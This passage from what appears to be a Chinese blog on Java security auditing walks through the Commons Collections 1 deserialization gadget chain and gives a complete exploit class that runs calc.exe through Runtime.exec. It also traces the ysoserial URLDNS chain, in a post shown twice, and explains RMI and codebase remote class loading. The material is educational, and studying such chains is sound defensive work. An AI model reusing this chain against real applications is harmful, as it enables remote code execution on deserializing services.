<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span></span>&#123;</span><br><span class="line">	<span class="keyword">super</span>();</span><br><span class="line">	iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt; iTransformers.length; i ++)&#123;</span><br><span class="line">		object = iTransformers[i].transform(object);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="理解demo"><a href="#理解demo" class="headerlink" title="理解demo"></a>理解demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">         <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">         <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">             <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       Transformer transformerChain= <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<p>通过新建一个ChainedTransformer，一开始包含了两个Transformer；第一个是ConstantTransformer，根据前面的学习，他的作用是构造函数的构造函数的时候传入一个对象，并在transform方法的时候将这个对象返回，而invokerTransformer，则是执行Runtime对象的exec，参数是后面的地址。</p>
<p>此时的ransformerChain将内部的多个TransformedMap串接在一起，将其和封装入innerMap，通过<strong>在Map中放入一个新元素</strong>触发回调</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">      Map outerMap=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line">      outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="用TransformedMap编写POC"><a href="#用TransformedMap编写POC" class="headerlink" title="用TransformedMap编写POC"></a>用TransformedMap编写POC</h2><p>要触发上面CC链，需要在Map中放入一个新元素来实现触发。因此我们需要找到一个链，在反序列化的起点readObject逻辑里有写入操作。</p>
<p>这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，其readObject方法中，我们重点关注一下写入部分的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">memberValue.setValue( <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy( value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember( annotationType.members().get(name)));</span><br></pre></td></tr></table></figure>

<p>其中memberValues就是反序列化后得到的Map，也是经过了TransormedMap修饰的对象，这里遍历了它的所有元素，并依次设置值，在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，那么就会执行我们上面构造的代码。</p>
<p> 由于<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是jdk内部的类，不能直接使用new来实例化，所以需要使用反射来获取到其构造方法，，而这个类的构造函数有两个参数，第一个参数是Annotation类，第二个参数是前面构造的Map。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct= clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj=construc.newInstance(Retention.class,outerMap);</span><br></pre></td></tr></table></figure>

<h3 id="为什么要使用反射"><a href="#为什么要使用反射" class="headerlink" title="为什么要使用反射"></a>为什么要使用反射</h3><p>通过使用以下代码，我们可以获得序列化流，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ByteArrayOutputStream barr&#x3D; new ByteArrayOutputStream();</span><br><span class="line">       ObjectOutputStream oos&#x3D; new ObjectOutputStream(barr);</span><br><span class="line">       oos.writeObject(obj);</span><br><span class="line">       oos.close();</span><br></pre></td></tr></table></figure>

<p>值得注意的是:<strong>待序列化的对象和所有它使用的内部属性对象，必须都实现<code>java.io.Serializable</code>接口</strong>，但是最早传给ConstantTransformaer的是Runtime.getRuntime(),Runtime类是没有实现java.io.Serializable接口，所以不允许被序列化。</p>
<p>​    因此我们可以通过反射来获取到上下文中的Runtime对象，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method f = Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Runtime r=(Runtime) f.invoke(<span class="keyword">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>转化为Transformer的写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">	<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">	<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">		String.class,</span><br><span class="line">		Class.class</span><br><span class="line">	&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">        Object.class,</span><br><span class="line">        Object[].class</span><br><span class="line">    &#125;,</span><br><span class="line">     <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">        String.class</span><br><span class="line">    &#125;,</span><br><span class="line">    	<span class="keyword">new</span> String[]&#123;</span><br><span class="line">            <span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span></span><br><span class="line">        &#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个和前面的区别在于，Runtime.getRuntime()换成了Runtime.class，前者为java.lang.Runtime对象，后者为java.lang.Class对象</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,</span><br><span class="line">                Object[].class</span><br><span class="line">            &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                String.class</span><br><span class="line">            &#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                    <span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span></span><br><span class="line">                &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain= <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        Map outerMap=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler) construct.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr= <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos= <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o=(Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>总结一下这部分的内容：首先利用的是Ysoserial的hashmap函数，实现反序列化，链条使用的类是commoncollections1中的，其中最重要的就是Transformed，可以调用一个函数，通过一系列操作，即可任意代码执行，但是值得一提的是，调用的类需要具有serialize接口，才能实现序列化。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/04/java_URLDNS/">java审计-反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-04</time><div class="content"><h2 id="readObject-writeObject"><a href="#readObject-writeObject" class="headerlink" title="readObject/writeObject"></a>readObject/writeObject</h2><p>java在序列化一个对象时，将会调用这个对象中的writeobject方法，参数类型是objectOutputStream，开发者可以将任何内容写入这个stream中，反序列化时，会调用readObject，开发者也可以从中读取出前面写入的内容，并进行处理</p>
<h2 id="ysoserial-URLDNS"><a href="#ysoserial-URLDNS" class="headerlink" title="ysoserial-URLDNS"></a>ysoserial-URLDNS</h2><p>gadget chains：利用链</p>
<p>URLDNS是ysoserial中一个利用链的名字，其结果是一次<strong>DNS请求</strong></p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>使用java内置的类构造，对第三方库没有依赖</li>
<li>在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>触发反序列化的方法是<code>readObject</code>，为了研究ysoserial中的这个利用链，我们从payload入手，其中写到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt;</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">	......</span><br><span class="line">	HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，在getObject中返回的被反序列化的对象是HashMap，因此接下来就是在这里打个断点，跟一下其过程</p>
<h4 id="如何使用ysoserial项目进行调试"><a href="#如何使用ysoserial项目进行调试" class="headerlink" title="如何使用ysoserial项目进行调试"></a>如何使用ysoserial项目进行调试</h4><p>打开工程，然后针对缺少的依赖，可以直接点击+号进行添加</p>
<p>接下来看一下pom.xml可以发现主类是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.GeneratePayload</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406112357.png" alt="img" style="zoom:67%;">

<p>接下来到这个主类这里进行分析，然后右键点击开始debug，在上面设置一下参数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145110.png" alt="image-20220406145109791"></p>
<p>可以发现已经跑起来了，并且在断点这里停下了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145152.png" alt="image-20220406145152006"></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>URLDNS的getObject为反序列化的起点，所以来这里进行分析，发现其调用了HasMap()，并且这边注释到会链接到URL</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145550.png" alt="image-20220406145550294"></p>
<p>在hashmap函数中，我们首先看看反序列化方法readObject(),而其中比较特殊的点就在这里，在前面所说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The Java URL class has an interesting property on its equals and</span><br><span class="line"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="line"> *   during a comparison (either equals or hashCode).</span><br></pre></td></tr></table></figure>

<p>因此我们继续跟进这个函数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406183653.png" alt="image-20220406183653328"></p>
<p>可以发现，在hash函数调用了hashcode的方法，并且此时传入我们一开始设定的url</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406193918.png" alt="image-20220406193918163"></p>
<p>再往下，可以发现这里的handler是指向一个url类的（一开始我在这里下断点，但是初始化debug的时候，也会经过这里，而那个只是在寻找jar包，所以这里的key的属性就不同了，导致后面的handler指向的函数也不同，有很多同名函数）</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194122.png" alt="image-20220406194122333"></p>
<p>而此时的handler就会指向URLStreamHandler的hashCode方法，在这个hashcode方法中可以发现调用了getHostAddress</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194654.png" alt="image-20220406194654193"></p>
<p>继续跟进，可以发现调用了getByName</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194859.png" alt="image-20220406194859359"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次的Gadget流程如下:<br>1.HashMap-&gt;readObject()<br>2.HashMap-&gt;hash()<br>3.URL-&gt;hashCode()<br>4.URLStreamHandler-&gt;hashCode()<br>5.URLStreamHandler-&gt;getHostAddress()<br>6.InetAddress-&gt;getByName()</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>知道整条利用链以后，就要学习一下如何编写反序列化exp了，后面再来补坑</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/04/java%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java_URLDNS</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-04</time><div class="content"><h2 id="readObject-writeObject"><a href="#readObject-writeObject" class="headerlink" title="readObject/writeObject"></a>readObject/writeObject</h2><p>java在序列化一个对象时，将会调用这个对象中的writeobject方法，参数类型是objectOutputStream，开发者可以将任何内容写入这个stream中，反序列化时，会调用readObject，开发者也可以从中读取出前面写入的内容，并进行处理</p>
<h2 id="ysoserial-URLDNS"><a href="#ysoserial-URLDNS" class="headerlink" title="ysoserial-URLDNS"></a>ysoserial-URLDNS</h2><p>gadget chains：利用链</p>
<p>URLDNS是ysoserial中一个利用链的名字，其结果是一次<strong>DNS请求</strong></p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>使用java内置的类构造，对第三方库没有依赖</li>
<li>在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>触发反序列化的方法是<code>readObject</code>，为了研究ysoserial中的这个利用链，我们从payload入手，其中写到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt;</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">	......</span><br><span class="line">	HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，在getObject中返回的被反序列化的对象是HashMap，因此接下来就是在这里打个断点，跟一下其过程</p>
<h4 id="如何使用ysoserial项目进行调试"><a href="#如何使用ysoserial项目进行调试" class="headerlink" title="如何使用ysoserial项目进行调试"></a>如何使用ysoserial项目进行调试</h4><p>打开工程，然后针对缺少的依赖，可以直接点击+号进行添加</p>
<p>接下来看一下pom.xml可以发现主类是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.GeneratePayload</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406112357.png" alt="img" style="zoom:67%;">

<p>接下来到这个主类这里进行分析，然后右键点击开始debug，在上面设置一下参数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145110.png" alt="image-20220406145109791"></p>
<p>可以发现已经跑起来了，并且在断点这里停下了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145152.png" alt="image-20220406145152006"></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>URLDNS的getObject为反序列化的起点，所以来这里进行分析，发现其调用了HasMap()，并且这边注释到会链接到URL</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145550.png" alt="image-20220406145550294"></p>
<p>在hashmap函数中，我们首先看看反序列化方法readObject(),而其中比较特殊的点就在这里，在前面所说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The Java URL class has an interesting property on its equals and</span><br><span class="line"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="line"> *   during a comparison (either equals or hashCode).</span><br></pre></td></tr></table></figure>

<p>因此我们继续跟进这个函数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406183653.png" alt="image-20220406183653328"></p>
<p>可以发现，在hash函数调用了hashcode的方法，并且此时传入我们一开始设定的url</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406193918.png" alt="image-20220406193918163"></p>
<p>再往下，可以发现这里的handler是指向一个url类的（一开始我在这里下断点，但是初始化debug的时候，也会经过这里，而那个只是在寻找jar包，所以这里的key的属性就不同了，导致后面的handler指向的函数也不同，有很多同名函数）</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194122.png" alt="image-20220406194122333"></p>
<p>而此时的handler就会指向URLStreamHandler的hashCode方法，在这个hashcode方法中可以发现调用了getHostAddress</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194654.png" alt="image-20220406194654193"></p>
<p>继续跟进，可以发现调用了getByName</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194859.png" alt="image-20220406194859359"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次的Gadget流程如下:<br>1.HashMap-&gt;readObject()<br>2.HashMap-&gt;hash()<br>3.URL-&gt;hashCode()<br>4.URLStreamHandler-&gt;hashCode()<br>5.URLStreamHandler-&gt;getHostAddress()<br>6.InetAddress-&gt;getByName()</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>知道整条利用链以后，就要学习一下如何编写反序列化exp了，后面再来补坑</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/30/java%E5%AE%A1%E8%AE%A1-rmi%E7%AF%87/">java审计-rmi协议</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-30</time><div class="content"><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI是Remote Method Invocation，远程方法调用。是让java虚拟机上的对象调用另一个java虚拟机中对象上的方法。</p>
<h3 id="RMI-Server"><a href="#RMI-Server" class="headerlink" title="RMI Server:"></a>RMI Server:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//继承了java.rmi.Remote接口，其中定义我们要远程调用的函数hello</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实现此接口的类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//主类，用来创建Registry,并将上面的类实例化后绑定到一个网址</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RemoteHelloWorld h=<span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>,h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIServer().start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>,<span class="keyword">new</span> RemoteHelloWorld());</span><br></pre></td></tr></table></figure>

<p>第一行创建并运行RMI Registry，第二行将Rexxx对象绑定到Hello这个名字上。</p>
<p>Naming.bind的第一个参数是一个URL，形如:rmi://host:port/name。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。</p>
<p>如果RMI Registry在本地运行，则host和port可以省略，默认为1099</p>
<h3 id="RMI-client"><a href="#RMI-client" class="headerlink" title="RMI client:"></a>RMI client:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Train;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.vulhub.RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello=(RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Heelo&quot;</span>);</span><br><span class="line">        String ret= hello.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通信分析"><a href="#通信分析" class="headerlink" title="通信分析"></a>通信分析</h3><p>整个通信过程进行了两次TCP握手，建立了两次TCP连接，首先客户端连接Registry,并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息，然后Registry返回一个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是一个远程对象</p>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMIServer；最后，远程⽅法实际上在RMI Server上调⽤。</p>
<h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="1-list-lookup远程调用"><a href="#1-list-lookup远程调用" class="headerlink" title="1.list+lookup远程调用"></a>1.list+lookup远程调用</h3><p>list方法可以列出目标上所有绑定的对象:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] s&#x3D; Naming.list(&quot;rmi:&#x2F;&#x2F;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>而lookup作用就是获得某个远程对象，若存在危险方法，则可进行调用</p>
<h3 id="2-RMI利用codebase执行任意代码"><a href="#2-RMI利用codebase执行任意代码" class="headerlink" title="2.RMI利用codebase执行任意代码"></a>2.RMI利用codebase执行任意代码</h3><p>codebase:是一个地址，告诉java虚拟机我们应该从哪个地方去搜索类，通常是远程URL、比如http、ftp等。</p>
<p>如果我们指定codebase=<a target="_blank" rel="noopener" href="http://exampl.com/,%E7%84%B6%E5%90%8E%E5%8A%A0%E8%BD%BDorg.vulhub.example.Example%E7%B1%BB%EF%BC%8C%E5%88%99java%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BC%9A%E4%B8%8B%E8%BD%BD%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6http://example.com/org/vulhub/example/Example.class">http://exampl.com/,然后加载org.vulhub.example.Example类，则java虚拟机会下载这个文件http://example.com/org/vulhub/example/Example.class</a> ，并作为Example类的字节码。</p>
<p>RMI流程中，反序列化时发现一个对象，先会在CLASSPAATH下寻找，若没找到，则会远程加载codebase中的类。</p>
<h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><ul>
